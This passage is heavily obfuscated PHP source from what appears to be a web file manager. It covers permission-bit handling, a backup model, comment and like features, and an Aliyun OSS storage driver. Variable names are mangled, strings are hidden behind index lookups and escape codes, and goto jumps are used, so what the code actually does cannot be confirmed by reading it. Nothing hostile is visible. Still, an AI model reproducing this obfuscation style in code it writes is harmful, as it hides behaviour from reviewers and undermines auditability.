$†Öğö÷¾ = array_merge($‡©ƒ»‡¼, $†Öğö÷¾); $†Öğö÷¾[$Š´º”óÚ[1926]] = $this->getSort(); $this->filterAuth($†Öğö÷¾[$Š´º”óÚ[457]]); return parent::insert($†Öğö÷¾); } private function getSort() { $¨¡µÑÒ  =& $_SERVER[Î‹ÃÂŞ„]; $ôœ¶ü­ú = parent::listData(); $‘ÄÎèõ = array_to_keyvalue($ôœ¶ü­ú, $¨¡µÑÒ [12], $¨¡µÑÒ [1926]); return empty($‘ÄÎèõ) ? 0 : max($‘ÄÎèõ) + 1; } private function filterAuth(&$Æë˜Ö½¶) { if (!$Æë˜Ö½¶) { return; } $ƒ–´éÓ€ = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $üÅ£€¹ = array(); foreach ($ƒ–´éÓ€ as $‚€Èİ») { if ($Æë˜Ö½¶ & $‚€Èİ») { $üÅ£€¹[] = $‚€Èİ»; } } if (in_array(self::AUTH_ROOT, $üÅ£€¹)) { $Æë˜Ö½¶ = array_sum($ƒ–´éÓ€); return; } $øøø¡± = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($üÅ£€¹ as $‚€Èİ») { if (isset($øøø¡±[$‚€Èİ»])) { $üÅ£€¹ = array_merge($üÅ£€¹, $øøø¡±[$‚€Èİ»]); } } $üÅ£€¹[] = self::AUTH_SHOW; $Æë˜Ö½¶ = array_sum(array_unique($üÅ£€¹)); } public function sort($áˆ§Ñ°¼, $³¯ÆÜ¦£) { return parent::update($áˆ§Ñ°¼, $³¯ÆÜ¦£); } } class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\x2e\x62\x61\x63\153\165\x70\x4c\x69\x73\x74"; public $field = array("\151\x6f", "\x6e\x61\x6d\x65", "\163\x74\x61\x74\165\163", "\143\x6f\x6e\x74\x65\x6e\x74", "\155\x61\x6e\165\141\154", "\162\145\163\x75\x6c\x74", "\x74\x69\x6d\x65\106\x72\x6f\x6d", "\x74\x69\x6d\145\x54\x6f"); public function config() { $ÙêÄ°É =& $_SERVER[Î‹ÃÂŞ„]; $şçóùü = Model($ÙêÄ°É[817])->get($ÙêÄ°É[827]); $şçóùü = json_decode($şçóùü, !0); $şçóùü = is_array($şçóùü) ? $şçóùü : array(); if (!isset($şçóùü[$ÙêÄ°É[801]])) { $şçóùü[$ÙêÄ°É[801]] = $ÙêÄ°É[90]; } unset($şçóùü[$ÙêÄ°É[1674]]); Action($ÙêÄ°É[1927])->taskInit(); Model($ÙêÄ°É[1673])->cacheClear(); $±‡¶³Óø = $ÙêÄ°É[1928]; $²İ¥ğùÁ = Model($ÙêÄ°É[1929])->findByKey($ÙêÄ°É[1692], $±‡¶³Óø); if (!$²İ¥ğùÁ) { $²İ¥ğùÁ = array(); } if (isset($²İ¥ğùÁ[$ÙêÄ°É[196]])) { $²İ¥ğùÁ[$ÙêÄ°É[196]] = json_decode($²İ¥ğùÁ[$ÙêÄ°É[196]], !0); } if (isset($şçóùü[$ÙêÄ°É[196]])) { $²İ¥ğùÁ[$ÙêÄ°É[196]][$ÙêÄ°É[1677]] = $şçóùü[$ÙêÄ°É[196]]; unset($şçóùü[$ÙêÄ°É[196]]); } return array_merge($²İ¥ğùÁ, $şçóùü); } public function listData($¤ê“ó‹½ = false, $çëï¦ = "\x6d\x6f\144\x69\146\171\x54\151\x6d\x65", $øü£ú‰ı = false) { return parent::listData($¤ê“ó‹½, $çëï¦, !0); } public function lastItem() { $ÀÈ¹…‰ = $this->listData(); return !empty($ÀÈ¹…‰[0]) ? $ÀÈ¹…‰[0] : null; } public function kill($…Á†Ñ–) { $ÃåŸŒÊ =& $_SERVER[Î‹ÃÂŞ„]; $çƒ÷è– = $this->listData($…Á†Ñ–); if (!$çƒ÷è– || empty($çƒ÷è–[$ÃåŸŒÊ[32]])) { return !0; } Task::kill($ÃåŸŒÊ[826]); Task::kill($ÃåŸŒÊ[847]); Task::kill($ÃåŸŒÊ[856]); $âêğšê = $çƒ÷è–[$ÃåŸŒÊ[32]]; $Ë©¨óîÔ = TEMP_FILES . $ÃåŸŒÊ[825] . $âêğšê . $ÃåŸŒÊ[8]; IO::remove($Ë©¨óîÔ, !1); return $this->remove($…Á†Ñ–); } public function remove($üşÖŒæ‘) { $»éøâš = $this->listData($üşÖŒæ‘); if (!$»éøâš) { return !0; } return $this->backupRemove($»éøâš); } private function backupRemove($ÜŒ…æĞ¡) { parent::remove($ÜŒ…æĞ¡[$_SERVER[Î‹ÃÂŞ„][445]]); $×ƒµôÜà = $this->backupPath($ÜŒ…æĞ¡); IO::remove($×ƒµôÜà, !1); return !0; } private function backupPath($Ğ·ù™º´) { $½‚ÜœÅ =& $_SERVER[Î‹ÃÂŞ„]; $©†‹éŒà = $Ğ·ù™º´[$½‚ÜœÅ[32]]; $Úáà™Ë = Model($½‚ÜœÅ[817])->get($½‚ÜœÅ[818]); $ü‹€Â¥Ù = substr(md5($½‚ÜœÅ[819] . $Úáà™Ë . $©†‹éŒà), 0, 8); return "\x7b\x69\x6f\x3a{$Ğ·ù™º´[$½‚ÜœÅ[798]]}\x7d\x2f\x64\141\x74\x61\142\141\x73\x65\57\x62\x61\x63\153\x75\160\57" . $©†‹éŒà . $½‚ÜœÅ[11] . $ü‹€Â¥Ù; } public function start() { $á”Úµß¥ =& $_SERVER[Î‹ÃÂŞ„]; if ($GLOBALS[$á”Úµß¥[6]][$á”Úµß¥[91]][$á”Úµß¥[1930]] != $á”Úµß¥[90]) { return !0; } $Ÿì¤Çí¡ = $this->config(); if (!$Ÿì¤Çí¡ || $Ÿì¤Çí¡[$á”Úµß¥[1674]] != $á”Úµß¥[90]) { return !1; } $«ò×õá¶ = $this->process(); foreach ($«ò×õá¶ as $çŒ“êÈò) { if ($çŒ“êÈò) { return Task::restart($çŒ“êÈò[$á”Úµß¥[445]]); } } $æ• Ú¡½ = new Backup(); $è¢¡úÎ„ = $æ• Ú¡½->db(); if ($è¢¡úÎ„) { $è¢¡úÎ„ = $æ• Ú¡½->dbFile(); if ($è¢¡úÎ„ && $Ÿì¤Çí¡[$á”Úµß¥[801]] == $á”Úµß¥[214]) { $è¢¡úÎ„ = $æ• Ú¡½->file(); } } Backup::set(array($á”Úµß¥[797] => 1, $á”Úµß¥[808] => time())); return !0; } public function process() { $˜Ùëı©¬ =& $_SERVER[Î‹ÃÂŞ„]; $©–²‰…ğ = array($˜Ùëı©¬[804] => Task::get($˜Ùëı©¬[826]), $˜Ùëı©¬[809] => Task::get($˜Ùëı©¬[847]), $˜Ùëı©¬[216] => Task::get($˜Ùëı©¬[856])); $£¤ëƒ• = !1; foreach ($©–²‰…ğ as &$Ö…ÉëÆ©) { if ($£¤ëƒ•) { $Ö…ÉëÆ© = !1; continue; } if ($Ö…ÉëÆ©) { $³Åœöõ = intval(_get($Ö…ÉëÆ©, $˜Ùëı©¬[1709], 0)); if (time() - $³Åœöõ > 7200) { Task::kill($Ö…ÉëÆ©[$˜Ùëı©¬[445]]); $£¤ëƒ• = !0; $Ö…ÉëÆ© = !1; } } } return $©–²‰…ğ; } public function restore() { $›Ë§Êé =& $_SERVER[Î‹ÃÂŞ„]; ActionCall($›Ë§Êé[1115], !0, 1); ActionCall($›Ë§Êé[1115], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\155\x65\x6e\x74"; protected $tableMeta = array("\164\141\x62\x6c\x65\x4e\x61\x6d\145" => "\x63\x6f\155\155\x65\x6e\x74\x5f\155\x65\164\x61", "\155\x65\164\141\106\151\145\154\144" => "\143\x6f\155\x6d\x65\156\164\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($—çÂ¢ê) { $Õ’¤”’ =& $_SERVER[Î‹ÃÂŞ„]; if ($—çÂ¢ê[$Õ’¤”’[1931]]) { $•¹¢÷ã¾ = $this->where(array($Õ’¤”’[1932] => $—çÂ¢ê[$Õ’¤”’[1931]]))->find(); if (!$•¹¢÷ã¾ || $•¹¢÷ã¾[$Õ’¤”’[180]] != $—çÂ¢ê[$Õ’¤”’[180]] || $•¹¢÷ã¾[$Õ’¤”’[541]] != $—çÂ¢ê[$Õ’¤”’[541]]) { return !1; } $this->where(array($Õ’¤”’[1932] => $—çÂ¢ê[$Õ’¤”’[1931]]))->setAdd($Õ’¤”’[1933], 1); } $—çÂ¢ê[$Õ’¤”’[1934]] = 0; $—çÂ¢ê[$Õ’¤”’[1933]] = 0; $—çÂ¢ê[$Õ’¤”’[797]] = 1; return $this->add($—çÂ¢ê); } public function commentCount($½£¨ÏÓù, $ÖÃûœ, $øÌå©ò = false) { $·°ÂøÖ¼ =& $_SERVER[Î‹ÃÂŞ„]; if (!$½£¨ÏÓù) { return array(); } if (is_string($½£¨ÏÓù) || is_int($½£¨ÏÓù)) { $½£¨ÏÓù = array($½£¨ÏÓù); } $ÒÏèÙÇş = array($·°ÂøÖ¼[541], $·°ÂøÖ¼[1935] => $·°ÂøÖ¼[536]); $¸òÁòì = array($·°ÂøÖ¼[541] => array($·°ÂøÖ¼[7], $½£¨ÏÓù), $·°ÂøÖ¼[180] => $ÖÃûœ); if ($øÌå©ò) { $¸òÁòì[$·°ÂøÖ¼[1704]] = $øÌå©ò; } $÷”§Ñ = $this->field($ÒÏèÙÇş)->where($¸òÁòì)->group($·°ÂøÖ¼[541])->select(); return array_to_keyvalue($÷”§Ñ, $·°ÂøÖ¼[541], $·°ÂøÖ¼[536]); } public function starTarget($õËİĞØ, $Ú‚íÑµà) { $ì›ñÚÀé =& $_SERVER[Î‹ÃÂŞ„]; $ï÷¾¯ç¯ = $õËİĞØ + self::TYPE_STAR_OFFSET; $Ü«‹ì…ä = array($ì›ñÚÀé[1704] => USER_ID, $ì›ñÚÀé[180] => $ï÷¾¯ç¯, $ì›ñÚÀé[541] => $Ú‚íÑµà); $Óê¨Êûì = $this->where($Ü«‹ì…ä)->find(); if ($Óê¨Êûì) { return $this->where(array($ì›ñÚÀé[445] => $Óê¨Êûì[$ì›ñÚÀé[445]]))->delete(); } $óÔº¤¥ = array($ì›ñÚÀé[1931] => 0, $ì›ñÚÀé[1704] => USER_ID, $ì›ñÚÀé[797] => 1, $ì›ñÚÀé[801] => $ì›ñÚÀé[12], $ì›ñÚÀé[180] => $ï÷¾¯ç¯, $ì›ñÚÀé[541] => $Ú‚íÑµà, $ì›ñÚÀé[1934] => 0, $ì›ñÚÀé[1933] => 0); return $this->add($óÔº¤¥); } public function starTargetCount($èş•ƒÇª, $ÌûôœÃˆ) { $Î¼’œßı =& $_SERVER[Î‹ÃÂŞ„]; $Ÿ¾¡Ü™ = $ÌûôœÃˆ + self::TYPE_STAR_OFFSET; $ƒ·Ë„Ò½ = $this->commentCount($èş•ƒÇª, $Ÿ¾¡Ü™); $™Şº¯œÑ = $this->commentCount($èş•ƒÇª, $Ÿ¾¡Ü™, USER_ID); return array($Î¼’œßı[1936] => $ƒ·Ë„Ò½, $Î¼’œßı[1937] => $™Şº¯œÑ); } public function starTargetUserList($æ°æ‘Şş, $ÔÛìŸ©) { $ÚÒù„Ì¤ =& $_SERVER[Î‹ÃÂŞ„]; $³÷ÒÈáË = $æ°æ‘Şş + self::TYPE_STAR_OFFSET; $Ïªçœª = array($ÚÒù„Ì¤[541] => $ÔÛìŸ©, $ÚÒù„Ì¤[180] => $³÷ÒÈáË); $´ä±üê = $this->where($Ïªçœª)->count(); $ˆ˜áŠÈ® = array($ÚÒù„Ì¤[301] => $´ä±üê, $ÚÒù„Ì¤[1938] => array()); if (!$´ä±üê) { return $ˆ˜áŠÈ®; } $Õ„é®¹» = $this->field($ÚÒù„Ì¤[1704])->where($Ïªçœª)->limit(500)->select(); $Õ„é®¹» = array_to_keyvalue($Õ„é®¹», $ÚÒù„Ì¤[12], $ÚÒù„Ì¤[1704]); $ˆ˜áŠÈ®[$ÚÒù„Ì¤[1938]] = Model($ÚÒù„Ì¤[549])->userListInfo($Õ„é®¹»); return $ˆ˜áŠÈ®; } public function prasiseUserList($Šãê‚) { $âçìŸ¸¦ =& $_SERVER[Î‹ÃÂŞ„]; $öšäùë™ = array($âçìŸ¸¦[1939] => $Šãê‚); $ÅÈ³æ°¨ = $this->where($öšäùë™)->find(); $ËíøÎ¼ = _get($ÅÈ³æ°¨, $âçìŸ¸¦[1934], 0); $‡“¦ÜÒ² = array($âçìŸ¸¦[301] => $ËíøÎ¼, $âçìŸ¸¦[1938] => array()); if (!$ËíøÎ¼) { return $‡“¦ÜÒ²; } $ëíšƒ’ = Model($âçìŸ¸¦[1940])->field($âçìŸ¸¦[1704])->where($öšäùë™)->limit(500)->select(); $ëíšƒ’ = array_to_keyvalue($ëíšƒ’, $âçìŸ¸¦[12], $âçìŸ¸¦[1704]); $‡“¦ÜÒ²[$âçìŸ¸¦[1938]] = Model($âçìŸ¸¦[549])->userListInfo($ëíšƒ’); return $‡“¦ÜÒ²; } public function remove($ıÏ­ÒÙù) { $úÙù–ÖÛ =& $_SERVER[Î‹ÃÂŞ„]; $‡İõûŞ = array($úÙù–ÖÛ[1932] => $ıÏ­ÒÙù); $ÙúŒ×ê = $this->where($‡İõûŞ)->find(); if ($ÙúŒ×ê[$úÙù–ÖÛ[1931]]) { $this->where(array($úÙù–ÖÛ[1932] => $ÙúŒ×ê[$úÙù–ÖÛ[1931]]))->setAdd($úÙù–ÖÛ[1933], -1); } return $this->where($‡İõûŞ)->delete(); } public function edit($ãéï¿œß, $ú®‘¢“à) { $¦ùàù¹ =& $_SERVER[Î‹ÃÂŞ„]; $ÖÌñÜúã = array($¦ùàù¹[1932] => $ãéï¿œß); return $this->where($ÖÌñÜúã)->save(array($¦ùàù¹[1941] => $ú®‘¢“à)); } public function prasise($¦’‹áá¥) { $£†ı§å› =& $_SERVER[Î‹ÃÂŞ„]; $óÓÏ±’ô = Model($£†ı§å›[1942]); $‹Ó–„íÖ = array($£†ı§å›[1932] => $¦’‹áá¥, $£†ı§å›[1695] => USER_ID); $•§Õ…¯¥ = $óÓÏ±’ô->where($‹Ó–„íÖ)->find(); if (!$•§Õ…¯¥) { $óÓÏ±’ô->add($‹Ó–„íÖ); $°¼˜œê = $this->where(array($£†ı§å›[1932] => $¦’‹áá¥))->setAdd($£†ı§å›[1934], 1); } else { $óÓÏ±’ô->where($‹Ó–„íÖ)->delete(); $°¼˜œê = $this->where(array($£†ı§å›[1932] => $¦’‹áá¥))->setAdd($£†ı§å›[1934], -1); } return $°¼˜œê; } public function targetInfo($„¬ÔÊÚë, $¬ŠûĞ¸“) { $ü¢ÃÔÆŒ =& $_SERVER[Î‹ÃÂŞ„]; $…—âïóø = array($ü¢ÃÔÆŒ[619] => $„¬ÔÊÚë, $ü¢ÃÔÆŒ[620] => $¬ŠûĞ¸“); $€Á³æµï = $this->where($…—âïóø)->count(); $Ì¬“ÓØ½ = "\122\111\x47\x48\x54\x20\x4a\117\111\x4e\x20{$this->tablePrefix}\143\157\x6d\155\x65\156\164\x5f\x70\162\x61\x69\163\x65\40\x73\164\141\x72\x20\157\x6e\x20\x63\157\155\155\145\156\164\56\x63\x6f\155\x6d\x65\x6e\x74\111\104\x20\75\40\x73\x74\x61\x72\x2e\x63\x6f\155\155\x65\x6e\164\x49\104"; $©ııœÌş = $this->alias($ü¢ÃÔÆŒ[400])->where($…—âïóø)->join($Ì¬“ÓØ½, $ü¢ÃÔÆŒ[1943])->count(); $’í“¬Ëğ = array($ü¢ÃÔÆŒ[1944] => $€Á³æµï, $ü¢ÃÔÆŒ[1945] => $©ııœÌş); return $’í“¬Ëğ; } public function listData($¯²¨¯šÛ) { $ƒÌ¥çŠÚ =& $_SERVER[Î‹ÃÂŞ„]; if (isset($¯²¨¯šÛ[$ƒÌ¥çŠÚ[1946]])) { if ($¯²¨¯šÛ[$ƒÌ¥çŠÚ[1946]]) { $¯²¨¯šÛ[$ƒÌ¥çŠÚ[1939]] = array($ƒÌ¥çŠÚ[1069], intval($¯²¨¯šÛ[$ƒÌ¥çŠÚ[1946]])); } unset($¯²¨¯šÛ[$ƒÌ¥çŠÚ[1946]]); } if (isset($¯²¨¯šÛ[$ƒÌ¥çŠÚ[1947]])) { if ($¯²¨¯šÛ[$ƒÌ¥çŠÚ[1947]]) { $¯²¨¯šÛ[$ƒÌ¥çŠÚ[1939]] = array($ƒÌ¥çŠÚ[1066], intval($¯²¨¯šÛ[$ƒÌ¥çŠÚ[1947]])); } unset($¯²¨¯šÛ[$ƒÌ¥çŠÚ[1947]]); } return $this->_listData($¯²¨¯šÛ); } private function _listData($öÑ›ã‘Î) { $ëÕø¬½í =& $_SERVER[Î‹ÃÂŞ„]; $ÔéÌâª = $this->where($öÑ›ã‘Î)->_makeOrder()->selectPage(100); $this->_listAppendParent($ÔéÌâª[$ëÕø¬½í[415]]); $this->_listAppendUser($ÔéÌâª[$ëÕø¬½í[415]]); $this->_listAppendMeta($ÔéÌâª[$ëÕø¬½í[415]]); return $ÔéÌâª; } private function _makeOrder() { $µÚï‹Ÿ£ =& $_SERVER[Î‹ÃÂŞ„]; $õÀÅ‘… = array($µÚï‹Ÿ£[1934], $µÚï‹Ÿ£[1933], $µÚï‹Ÿ£[217]); $ü´ÀüşÀ = Input::get($µÚï‹Ÿ£[500], $µÚï‹Ÿ£[7], $µÚï‹Ÿ£[467], $õÀÅ‘…); $›ÁùÜ™ñ = Input::get($µÚï‹Ÿ£[501], $µÚï‹Ÿ£[7], $µÚï‹Ÿ£[1697], array($µÚï‹Ÿ£[1948], $µÚï‹Ÿ£[496])); $‚²çÇÇì = $ü´ÀüşÀ . $µÚï‹Ÿ£[53] . $›ÁùÜ™ñ; return $this->order($‚²çÇÇì); } private function _listAppendParent(&$Ã¯‡†¸) { $Ãø¢ù¸ =& $_SERVER[Î‹ÃÂŞ„]; $©»è´÷ = array_unique(array_to_keyvalue($Ã¯‡†¸, $Ãø¢ù¸[12], $Ãø¢ù¸[1931])); $©»è´÷ = array_remove_value($©»è´÷, $Ãø¢ù¸[214]); if (!$©»è´÷) { return; } $’»Á®ï¤ = $this->where(array($Ãø¢ù¸[1932] => array($Ãø¢ù¸[7], $©»è´÷)))->select(); $’»Á®ï¤ = array_to_keyvalue($’»Á®ï¤, $Ãø¢ù¸[1939]); foreach ($Ã¯‡†¸ as &$î¤ÓÒ²©) { if (isset($’»Á®ï¤[$î¤ÓÒ²©[$Ãø¢ù¸[1931]]])) { $î¤ÓÒ²©[$Ãø¢ù¸[1949]] = $’»Á®ï¤[$î¤ÓÒ²©[$Ãø¢ù¸[1931]]]; } } unset($î¤ÓÒ²©); } private function _listAppendUser(&$ìÕé†ûí) { $ „Ë¹ˆ× =& $_SERVER[Î‹ÃÂŞ„]; $ÆĞÊ†Ì = array_unique(array_to_keyvalue($ìÕé†ûí, $ „Ë¹ˆ×[12], $ „Ë¹ˆ×[1704])); $ÆĞÊ†Ì = array_remove_value($ÆĞÊ†Ì, $ „Ë¹ˆ×[214]); if (count($ÆĞÊ†Ì) == 0) { return; } foreach ($ìÕé†ûí as $î‡Ç«è) { if (isset($î‡Ç«è[$ „Ë¹ˆ×[1949]])) { $ÆĞÊ†Ì[] = $î‡Ç«è[$ „Ë¹ˆ×[1949]][$ „Ë¹ˆ×[1704]]; } } $‚ŠÁ’¥Ú = Model($ „Ë¹ˆ×[570])->userListInfo($ÆĞÊ†Ì); foreach ($ìÕé†ûí as &$î‡Ç«è) { $î‡Ç«è[$ „Ë¹ˆ×[633]] = $‚ŠÁ’¥Ú[$î‡Ç«è[$ „Ë¹ˆ×[1704]]]; if (isset($î‡Ç«è[$ „Ë¹ˆ×[1949]])) { $î‡Ç«è[$ „Ë¹ˆ×[1949]][$ „Ë¹ˆ×[633]] = $‚ŠÁ’¥Ú[$î‡Ç«è[$ „Ë¹ˆ×[1949]][$ „Ë¹ˆ×[1704]]]; } } unset($î‡Ç«è); } private function _listAppendMeta(&$Ñ‹ç¦Ğ¦) { $õ¸Õ‘–Õ =& $_SERVER[Î‹ÃÂŞ„]; $¯ö¹¬ÖÛ = array_unique(array_to_keyvalue($Ñ‹ç¦Ğ¦, $õ¸Õ‘–Õ[12], $õ¸Õ‘–Õ[1939])); $¯ö¹¬ÖÛ = array_remove_value($¯ö¹¬ÖÛ, $õ¸Õ‘–Õ[214]); if (!$¯ö¹¬ÖÛ) { return; } foreach ($Ñ‹ç¦Ğ¦ as $Ë¢›Ó¹¸) { if (isset($Ë¢›Ó¹¸[$õ¸Õ‘–Õ[1949]])) { $¯ö¹¬ÖÛ[] = $Ë¢›Ó¹¸[$õ¸Õ‘–Õ[1949]][$õ¸Õ‘–Õ[1939]]; } } $é•º’¶Î = $this->metaList($¯ö¹¬ÖÛ); if (!$é•º’¶Î) { return !1; } foreach ($Ñ‹ç¦Ğ¦ as &$Ë¢›Ó¹¸) { $Ë¢›Ó¹¸[$õ¸Õ‘–Õ[509]] = $é•º’¶Î[$Ë¢›Ó¹¸[$õ¸Õ‘–Õ[1939]]]; if (isset($Ë¢›Ó¹¸[$õ¸Õ‘–Õ[1949]])) { $Ë¢›Ó¹¸[$õ¸Õ‘–Õ[1949]][$õ¸Õ‘–Õ[509]] = $é•º’¶Î[$Ë¢›Ó¹¸[$õ¸Õ‘–Õ[1949]][$õ¸Õ‘–Õ[1939]]]; } } unset($Ë¢›Ó¹¸); } private function metaList($ô´²‹¨Û) { $˜µ£„¾Ú =& $_SERVER[Î‹ÃÂŞ„]; if (!$ô´²‹¨Û) { return array(); } $ÓüÍª“å = array($˜µ£„¾Ú[1939] => array($˜µ£„¾Ú[7], $ô´²‹¨Û)); $«é¹…´ö = Model($˜µ£„¾Ú[1950])->where($ÓüÍª“å)->select(); $«é¹…´ö = array_to_keyvalue_group($«é¹…´ö, $˜µ£„¾Ú[1939]); foreach ($«é¹…´ö as $˜ƒÓ¸õÈ => $ŒÎê¸ˆæ) { $µ­ú…½æ = array(); foreach ($ŒÎê¸ˆæ as $ÔÚ“ì¿À) { $µ­ú…½æ[$ÔÚ“ì¿À[$˜µ£„¾Ú[96]]] = $ÔÚ“ì¿À[$˜µ£„¾Ú[420]]; } $«é¹…´ö[$˜ƒÓ¸õÈ] = $µ­ú…½æ; } return $«é¹…´ö ? $«é¹…´ö : array(); } } goto câÜ¸Ôô÷Œ; fËº¼äÎœ: class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public $config = array(); public function __construct($±ˆöÈ™“) { parent::__construct(); include_once SDK_DIR . $_SERVER[Î‹ÃÂŞ„][1427]; $this->_init($±ˆöÈ™“); } public function _init($«ùÂ•»ê) { $º£ŠÏ¤ğ =& $_SERVER[Î‹ÃÂŞ„]; $this->config = $«ùÂ•»ê; foreach ($«ùÂ•»ê as $Õ’ıéÄ… => $›é¨âü£) { if (isset($this->{$Õ’ıéÄ…})) { $this->{$Õ’ıéÄ…} = $›é¨âü£; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($º£ŠÏ¤ğ[1428] . LNG($º£ŠÏ¤ğ[1429])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { $œ¦»Ä¬ç =& $_SERVER[Î‹ÃÂŞ„]; $¶±·Ş€„ = new OSS\Model\CorsConfig(); $‘©ÓÔà‘ = new OSS\Model\CorsRule(); $‘©ÓÔà‘->addAllowedOrigin($œ¦»Ä¬ç[1430]); $‘©ÓÔà‘->addAllowedMethod($œ¦»Ä¬ç[1431]); $‘©ÓÔà‘->addAllowedMethod($œ¦»Ä¬ç[1432]); $‘©ÓÔà‘->addAllowedMethod($œ¦»Ä¬ç[1433]); $‘©ÓÔà‘->addAllowedMethod($œ¦»Ä¬ç[1434]); $‘©ÓÔà‘->addAllowedMethod($œ¦»Ä¬ç[163]); $‘©ÓÔà‘->setMaxAgeSeconds(600); $‘©ÓÔà‘->addExposeHeader($œ¦»Ä¬ç[1435]); $‘©ÓÔà‘->addAllowedHeader($œ¦»Ä¬ç[1430]); $¶±·Ş€„->addRule($‘©ÓÔà‘); try { $this->client->putBucketCors($this->bucket, $¶±·Ş€„); } catch (OSS\Core\OssException $ë¤²‚¨´) { return !1; } return !0; } public function getBucketCors() { $İÈ‚Åİ¤ =& $_SERVER[Î‹ÃÂŞ„]; $’ğÌ«“‡ = null; try { $’ğÌ«“‡ = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $Ñ´Ï„) { return null; } if (!$’ğÌ«“‡ || !($â¤»ú¯´ = $’ğÌ«“‡->getRules())) { return null; } $Õ×ëëíø = $â¤»ú¯´[0]->getAllowedOrigins(); $‚òâ”ñÈ = $â¤»ú¯´[0]->getAllowedMethods(); $¿‚ÙàÆ¥ = $â¤»ú¯´[0]->getMaxAgeSeconds(); $ïúŒäœ‰ = $â¤»ú¯´[0]->getExposeHeaders(); $ÏŸºë£ = $â¤»ú¯´[0]->getAllowedHeaders(); return array($İÈ‚Åİ¤[204] => isset($Õ×ëëíø[0]) ? $Õ×ëëíø[0] : $İÈ‚Åİ¤[12], $İÈ‚Åİ¤[208] => $‚òâ”ñÈ, $İÈ‚Åİ¤[1436] => $¿‚ÙàÆ¥, $İÈ‚Åİ¤[1437] => isset($ïúŒäœ‰[0]) ? $ïúŒäœ‰[0] : $İÈ‚Åİ¤[12], $İÈ‚Åİ¤[206] => isset($ÏŸºë£[0]) ? $ÏŸºë£[0] : $İÈ‚Åİ¤[12]); } public function isBucketCors() { $áÙ¼· =& $_SERVER[Î‹ÃÂŞ„]; $ùõ¼«ƒÒ = $this->getBucketCors(); if (!$ùõ¼«ƒÒ || !is_array($ùõ¼«ƒÒ)) { return !1; } if ($ùõ¼«ƒÒ[$áÙ¼·[204]] != $áÙ¼·[205] || $ùõ¼«ƒÒ[$áÙ¼·[206]] != $áÙ¼·[205]) { return !1; } $•¶«îøÚ = array_map($áÙ¼·[207], $ùõ¼«ƒÒ[$áÙ¼·[208]]); if (!is_array($•¶«îøÚ)) { $•¶«îøÚ = array(); } $§Â˜›©± = array($áÙ¼·[209], $áÙ¼·[210], $áÙ¼·[211], $áÙ¼·[212], $áÙ¼·[213]); $»ì¥ßöü = array_diff($§Â˜›©±, $•¶«îøÚ); return empty($»ì¥ßöü); } public function mkfile($˜îãÂ–Ê, $Ÿ¼ı¸€– = '', $Úö›ƒòä = REPEAT_RENAME) { $ñ£Ö’Ñı = $this->setContent($˜îãÂ–Ê, $Ÿ¼ı¸€–); if ($ñ£Ö’Ñı !== !1) { return $this->getPathOuter($˜îãÂ–Ê); } return !1; } public function mkdir($¢¾÷£Åç, $”É‹‘û = REPEAT_SKIP) { if ($”É‹‘û && $this->_isFolder($¢¾÷£Åç)) { return $this->getPathOuter($¢¾÷£Åç); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($¢¾÷£Åç)); } catch (OSS\Core\OssException $˜¯š¾´) { return !1; } return $this->getPathOuter($¢¾÷£Åç); } private function fileList($†üÆ¥Á, $Ø÷‡®Ùä = '', $ãÚëÑİ = 0) { $‹›—¥äî =& $_SERVER[Î‹ÃÂŞ„]; $†üÆ¥Á = trim($†üÆ¥Á, $‹›—¥äî[8]); $‘ç´é÷ç = empty($†üÆ¥Á) && $†üÆ¥Á !== $‹›—¥äî[214] ? $‹›—¥äî[12] : $†üÆ¥Á . $‹›—¥äî[8]; $ûœø¥ÈÉ = $‹›—¥äî[12]; $‚ÛÆÒ÷® = 1000; $ÎÑ—ô° = $İ¿À¿†Ú = array(); while (!0) { check_abort(); $¿ğüÉç = array($‹›—¥äî[1438] => $Ø÷‡®Ùä, $‹›—¥äî[1439] => $‘ç´é÷ç, $‹›—¥äî[1440] => $‚ÛÆÒ÷®, $‹›—¥äî[1441] => $ûœø¥ÈÉ); try { $°¦Šäˆì = $this->client->listObjects($this->bucket, $¿ğüÉç); } catch (OSS\Core\OssException $©Ò§Ø”Š) { break; } $ûœø¥ÈÉ = $°¦Šäˆì->getNextMarker(); $À”œ ÁÜ = $°¦Šäˆì->getObjectList(); $»ÅÆËÌö = $°¦Šäˆì->getPrefixList(); foreach ($À”œ ÁÜ as $ûÚı¡ÛÚ) { if ($ûÚı¡ÛÚ->getKey() == $‘ç´é÷ç) { continue; } $£âØíØ = $ûÚı¡ÛÚ->getKey(); $¡Š†¦£ = $ûÚı¡ÛÚ->getSize(); $îô¹„™¦ = $ûÚı¡ÛÚ->getLastModified(); $¾«óÈíÃ = trim($ûÚı¡ÛÚ->getETag(), $‹›—¥äî[120]); $Š„«û÷Í = $ãÚëÑİ ? array($‹›—¥äî[32] => $£âØíØ, $‹›—¥äî[78] => $¡Š†¦£, $‹›—¥äî[196] => strtotime($îô¹„™¦), $‹›—¥äî[1442] => $¾«óÈíÃ) : $£âØíØ; $ŸÔ¿åìü = $¡Š†¦£ == 0 && substr($£âØíØ, strlen($£âØíØ) - 